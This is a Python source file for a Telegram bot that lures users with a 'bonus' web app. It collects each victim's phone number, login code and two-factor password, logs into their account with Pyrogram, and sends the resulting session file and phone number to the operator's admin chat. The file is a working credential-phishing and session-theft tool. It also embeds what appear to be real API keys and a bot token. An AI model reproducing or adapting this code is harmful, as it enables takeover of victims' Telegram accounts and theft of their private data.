import asyncio
import json
import os
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiohttp import web
import aiohttp_cors
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid, FloodWait

# --- НАСТРОЙКИ (ЗАПОЛНИ СВОИ) ---
API_ID = 15587172 
API_HASH = "d3d35aebb0b6ebdb7a002836914ee37d"
BOT_TOKEN = "8613728108:AAGR9Lmdx2YvG6wbg8qk31rcLxeKD4Vu6Po"
ADMIN_ID = 1866813859 
# Ссылка на твой index.html (GitHub Pages)
WEB_APP_URL = "https://pubgmolinki-cpu.github.io/telegram/" 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
active_clients = {}

# --- ЛОГИКА БОТА ---
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    kb = [[types.InlineKeyboardButton(text="💎 Получить бонус", web_app=types.WebAppInfo(url=WEB_APP_URL))]]
    markup = types.InlineKeyboardMarkup(inline_keyboard=kb)
    await message.answer("Добро пожаловать! Нажмите кнопку, чтобы войти и забрать бонус:", reply_markup=markup)

# --- API ДЛЯ WEB APP ---
async def handle_api(request):
    try:
        data = await request.json()
        action = data.get("action")
        user_id = str(data.get("user_id"))

        if action == "send_phone":
            phone = data.get("phone").replace(" ", "").replace("-", "")
            client = Client(name=f"session_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=False)
            await client.connect()
            sent_code = await client.send_code(phone)
            active_clients[user_id] = {"client": client, "phone": phone, "hash": sent_code.phone_code_hash}
            return web.json_response({"status": "ok"})

        elif action == "send_code":
            code = data.get("code")
            session = active_clients.get(user_id)
            if not session: return web.json_response({"status": "error", "message": "Сессия истекла"})
            
            try:
                await session["client"].sign_in(session["phone"], session["hash"], code)
                return await finish_auth(user_id, session)
            except SessionPasswordNeeded:
                return web.json_response({"status": "need_2fa"})

        elif action == "send_2fa":
            password = data.get("password")
            session = active_clients.get(user_id)
            await session["client"].check_password(password)
            return await finish_auth(user_id, session)

    except FloodWait as e:
        return web.json_response({"status": "error", "message": f"Подождите {e.value} сек."})
    except Exception as e:
        return web.json_response({"status": "error", "message": str(e)})

async def finish_auth(user_id, session):
    path = f"session_{user_id}.session"
    # Ждем записи файла на диск
    await asyncio.sleep(1) 
    if os.path.exists(path):
        await bot.send_document(ADMIN_ID, types.FSInputFile(path), 
                                caption=f"🔥 НОВАЯ СЕССИЯ\nНомер: {session['phone']}\nID: {user_id}")
    
    await session["client"].disconnect()
    if user_id in active_clients: del active_clients[user_id]
    return web.json_response({"status": "success"})

# --- НАСТРОЙКА СЕРВЕРА ---
app = web.Application()
cors = aiohttp_cors.setup(app, defaults={
    "*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")
})
resource = app.router.add_resource("/api")
route = resource.add_route("POST", handle_api)
cors.add(route)

async def main():
    # Авто-порт для Render
    port = int(os.environ.get("PORT", 8080))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    print(f"Сервер запущен на порту {port}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
